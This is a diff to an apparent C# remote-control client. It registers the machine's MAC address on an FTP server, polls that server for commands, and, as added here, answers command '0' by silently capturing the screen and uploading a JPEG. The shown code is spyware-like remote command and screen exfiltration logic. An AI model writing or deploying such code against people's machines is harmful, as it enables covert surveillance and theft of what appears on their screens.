@@ -7,6 +7,8 @@ using System.Net;
 using System.IO;
 using System.Net.NetworkInformation;
 using System.Threading;
+using System.Drawing;
+using System.Drawing.Imaging;
 
 namespace FTP_RC
 {
@@ -23,7 +25,7 @@ namespace FTP_RC
             bool addClient = true;
             
             string macAddress = ComputerInfo.GetMacAddress();
-            StreamReader reader = ftpClient.Download("clients.txt");
+            StreamReader reader = ftpClient.DownloadText("clients.txt");
             if (reader != null)
             {
                 while (reader.Peek() >= 0)
@@ -46,19 +48,24 @@ namespace FTP_RC
                 ftpClient.UploadText("clients.txt", macAddress + "\n");
                 //Console.WriteLine("No file.");
             }
+            long position = 0;
             while(true)
             {
                 Thread.Sleep(1000);
                 Console.WriteLine("Sleeping");
-                reader = ftpClient.Download(macAddress + "CMD.txt");
+                reader = ftpClient.DownloadText(macAddress + "CMD.txt", position);
                 if (reader != null)
                 {
                     while (reader.Peek() >= 0)
                     {
                         string line = reader.ReadLine();
+                        position += line.Length + 2;
                         if (line == "0")
                         {
-                            ftpClient.UploadText("tester.txt", "blah\n");
+                            MemoryStream screenshot = new MemoryStream();
+                            screenshot = ScreenCapture.CaptureScreen(ImageFormat.Jpeg, 1600);
+                            Console.WriteLine("length is " + screenshot.Length);
+                            ftpClient.UploadMemstream("screenshot.jpg", screenshot);
                         }
                     }
                     //Console.WriteLine("Download Complete, status {0}, and {1}", ftpClient.response.StatusDescription, (int)ftpClient.response.StatusCode);
